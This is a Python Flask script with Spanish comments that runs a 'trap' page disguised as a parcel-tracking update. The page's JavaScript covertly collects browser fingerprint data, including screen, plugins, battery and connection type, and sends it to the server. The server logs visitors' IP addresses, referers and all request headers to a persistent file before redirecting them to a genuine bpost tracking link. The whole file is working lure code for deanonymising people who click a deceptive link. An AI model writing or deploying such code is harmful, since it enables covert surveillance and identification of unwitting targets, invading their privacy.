import logging
import requests
import os
from datetime import datetime
from flask import Flask, request, redirect, render_template_string

# --- CONFIGURACIÓN DE LOGGING PERSISTENTE ---
# Ruta donde se guardará el archivo de log. Se recomienda una ruta absoluta o una relativa manejable.
# En un VPS, asegúrate de que el usuario que ejecuta la app tenga permisos de escritura aquí.
LOG_FILE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'trap_activity.log')

# Configuración del logging: escribe a un archivo y también a la consola (si es necesario)
# Con 'a' para append (añadir), no sobrescribe cada vez que se reinicia la app.
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE_PATH, mode='a', encoding='utf-8'),
        logging.StreamHandler() # También envía logs a la consola, útil para depuración.
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# URL a la que redirigir. Usa la .be que parece la oficial y más fiable.
REDIRECT_URL = "https://track.bpost.be/btr/web/#/home?itemCodes=CE539544965BE"

# HTML de la página de aterrizaje.
# CON LA LÍNEA meta refresh y el JavaScript actualizado.
LANDING_PAGE_HTML = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Actualizando seguimiento de paquete...</title>
    <!-- ¡LÍNEA CRÍTICA PARA REDIRECCIÓN ROBUSTA Y UNIVERSAL! -->
    <meta http-equiv="refresh" content="5;url={{ redirect_url }}">
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f0f2f5; color: #333; }
        .container { background-color: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; max-width: 500px; width: 90%; }
        h1 { color: #e44d26; margin-bottom: 20px; }
        p { font-size: 1.1em; line-height: 1.6; }
        .spinner {
            border: 4px solid rgba(0, 0, 0.1);
            border-left-color: #e44d26;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        a { color: #e44d26; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Actualizando información de seguimiento...</h1>
        <div class="spinner"></div>
        <p>Por favor, espere mientras cargamos la información más reciente de su paquete. Esto puede tardar unos segundos.</p>
        <p>Si la página no se actualiza automáticamente, haga clic <a href="{{ redirect_url }}">aquí</a> para ir directamente.</p>
    </div>

    <script>
        async function sendMoreData() {
            // Recopilación de datos más completa, incluyendo cabeceras HTTP si fuera posible (limitado por CORS en fetch)
            const data = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookieEnabled: navigator.cookieEnabled,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                timezoneOffset: new Date().getTimezoneOffset(),
                // Información de conectividad (disponible en algunos navegadores)
                connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                // Plugins y MIME types (a veces limitado por seguridad de navegador)
                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'N/A',
                mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type).join(', ') || 'N/A',
                // ¿Están activos los bloqueadores de anuncios? (estimación)
                adBlockerDetected: typeof window.google_ad_client === 'undefined' ? true : false,
                // Información de batería (requiere permiso en algunos navegadores)
                batteryInfo: null
            };

            // Intenta obtener información de batería si el navegador lo permite
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    data.batteryInfo = {
                        level: battery.level,
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (e) {
                    console.warn("No se pudo obtener la información de la batería:", e);
                }
            }

            try {
                await fetch('/log_data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                console.log("Datos adicionales enviados.");
            } catch (error) {
                console.error('Error enviando datos adicionales:', error);
            }
        }

        window.onload = function() {
            sendMoreData(); // Ejecuta la recolección de datos adicionales
            // El JS setTimeout se mantiene como una capa extra de seguridad/fallback
            setTimeout(function() {
                window.location.href = "{{ redirect_url }}";
            }, 5500); // Pequeño margen extra sobre el meta refresh
        };
    </script>
</body>
</html>
"""

# Tu ruta principal (/)
@app.route('/', methods=['GET', 'POST'])
def trap():
    # --- LOGGING DESDE EL SERVIDOR (Flask) ---
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'N/A')
    referrer = request.headers.get('Referer', 'N/A')
    accept_language = request.headers.get('Accept-Language', 'N/A')

    # Registra toda la información relevante en el archivo de log
    logger.info(f"--- ACCESO INICIADO ---")
    logger.info(f"IP Cliente: {client_ip}")
    logger.info(f"User-Agent: {user_agent}")
    logger.info(f"Referer: {referrer}")
    logger.info(f"Accept-Language: {accept_language}")
    logger.info(f"Hora del servidor: {datetime.now().isoformat()}")
    
    # Si la petición es POST (raro para el primer acceso, pero puede pasar)
    if request.method == 'POST':
        logger.info(f"Método de Petición: POST")
        try:
            post_data = request.get_data(as_text=True)
            logger.info(f"Datos POST: {post_data}")
        except Exception as e:
            logger.error(f"Error al leer datos POST: {e}")

    # Loggear todos los headers de la petición para máxima información
    logger.debug("--- HEADERS COMPLETOS ---")
    for header, value in request.headers.items():
        logger.debug(f"HEADER: {header}: {value}")
    logger.debug("--- FIN HEADERS COMPLETOS ---")


    return render_template_string(LANDING_PAGE_HTML, redirect_url=REDIRECT_URL)

# Ruta para recibir los datos adicionales del JavaScript
@app.route('/log_data', methods=['POST'])
def log_data():
    client_ip = request.remote_addr # Vuelve a capturar la IP para este log, si quieres correlacionar
    if request.is_json:
        data = request.get_json()
        logger.info(f"--- DATOS ADICIONALES JS RECIBIDOS (desde IP: {client_ip}) ---")
        for key, value in data.items():
            logger.info(f"  JS Data - {key}: {value}")
        logger.info(f"--- FIN DATOS ADICIONALES JS ---")
        return {"status": "success", "message": "Datos de cliente recibidos y logueados"}, 200
    else:
        logger.warning(f"Solicitud a /log_data no es JSON desde IP: {client_ip}")
        # Loggear el cuerpo crudo si no es JSON para depuración
        try:
            raw_body = request.get_data(as_text=True)
            logger.warning(f"Cuerpo no JSON recibido: {raw_body}")
        except Exception as e:
            logger.error(f"Error al leer cuerpo no JSON: {e}")
        return {"status": "error", "message": "Request must be JSON"}, 400

if __name__ == '__main__':
    # Para ejecución local o con Serveo:
    # `debug=True` reinicia la app automáticamente en cambios y da más info, pero NO usar en producción (VPS)
    app.run(host='0.0.0.0', port=8081, debug=False)



